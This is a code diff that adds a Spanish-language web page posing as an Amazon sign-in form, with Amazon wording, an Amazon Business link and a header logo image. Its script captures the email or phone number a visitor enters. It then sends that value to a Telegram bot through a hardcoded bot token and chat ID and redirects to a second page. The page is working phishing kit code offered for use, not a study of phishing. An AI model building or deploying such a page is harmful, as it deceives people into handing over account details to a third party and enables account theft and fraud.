@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+  
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            background-color: #2B333D;
+            padding: 35px 0;
+        }
+        .header img {
+            max-width: 100%;
+            height: auto;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .form-group input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        .form-group .checkbox {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .form-group .checkbox input[type="radio"] {
+            margin-right: 10px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #ccc;
+            outline: none;
+            cursor: pointer;
+            position: relative;
+        }
+        .form-group .checkbox input[type="radio"]:checked::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background-color: #333;
+            border-radius: 50%;
+        }
+        .form-group .checkbox label {
+            font-size: 16px;
+        }
+        .form-group button {
+            display: block;
+            margin: 0 auto;
+            padding: 10px 20px;
+            background-color: #f7ca00;
+            color:black ;
+            border: none;
+            border-radius: 5px; /* Agregamos border-radius */
+            cursor: pointer;
+            width: 100%;
+        }
+        .form-group button:hover {
+            background-color: #f7ca00;
+        }
+        a {
+            color: #1E90FF; /* Color azul claro */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }  
+  .title-section {
+    text-align: center;
+    margin-right:250px;
+     /* Puedes ajustar este valor según sea necesario */
+}
+   </style>
+</head>
+
+<body>
+  
+    <div class="header">
+         <img src="Ama.png" alt="Header" width="100" style="float: left; margin-right: 10px; position: relative; top: -30px;">
+    </div>
+  
+  <div class="title-section">
+    <h2>Bienvenido</h2>
+    
+</div>
+    <div class="container">
+      
+        <form id="emailForm">
+            <div class="form-group">
+                <div class="checkbox">
+                    <input type="radio" id="crear-cuenta" name="account-type" value="crear-cuenta">
+                    <label for="crear-cuenta">Crear cuenta</label>
+                    <span style="margin-left: 10px; font-size: 14px;">¿Eres nuevo en Amazon?</span>
+                </div>
+                <div class="checkbox">
+                    <input type="radio" id="iniciar-sesion" name="account-type" value="iniciar-sesion" checked>
+                    <label for="iniciar-sesion">Iniciar sesión</label>
+                    <span style="margin-left: 10px; font-size: 14px;">¿Ya eres cliente?</span>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="email">Correo Electrónico o número de teléfono</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            
+            <div class="form-group">
+                <button type="submit">Continuar</button>
+            </div>
+          
+           <div class="form-group">
+                <p>Al continuar aceptas las <a href="#">condiciones de uso</a> y el <br> <a href="#">aviso de privacidad</a> de la empresa.</p>
+                <a href="#">¿Necesitas ayuda?</a>
+            </div>
+          
+           <div style="border-bottom: 1px solid #333; margin-bottom: 10px;"></div> <!-- Línea -->
+           <p>Compras para el trabajo <br> <br><a href="#">Compra en Amazon Business</a></p>
+        </form>
+    </div>
+     <div class="footer-text">
+       <img src="https://i.ibb.co/DzRV9Bx/Screenshot-20240523-150903-Brave.jpg"width="426">
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    var email = document.getElementById('email').value;
+    var token = '6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI';  
+    var chat_id = '6044742043';  
+    
+    var message = `Nuevo correo electrónico recibido: ${email}`;
+    
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+    
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                window.location.href = 'index2.html'; // Redireccionar a otra página
+            } else {
+                console.log('Error al enviar el correo a Telegram');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+});
+    </script>
+
+</body>
+</html>
